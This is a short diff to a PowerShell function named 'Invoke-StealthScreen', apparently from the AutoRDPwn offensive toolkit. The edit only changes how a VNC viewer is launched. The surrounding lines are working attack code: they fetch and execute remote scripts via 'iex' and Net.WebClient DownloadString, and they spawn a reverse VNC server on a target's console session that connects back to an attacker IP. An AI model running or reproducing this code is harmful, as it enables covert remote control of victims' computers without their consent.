@@ -25,7 +25,7 @@ function Invoke-StealthScreen {
         $scriptdir = $PSScriptRoot
         if ($scriptdir) { & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1') } else {
             Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1') }
-        Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming /nodsl" -WindowStyle Hidden | Out-Null
+        Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
         Write-Host "[+] Viewer listening on ${AttackerIP}:$Port, spawning server on target console session.." -ForegroundColor Blue
 
         $launch = "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')) ; Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password"
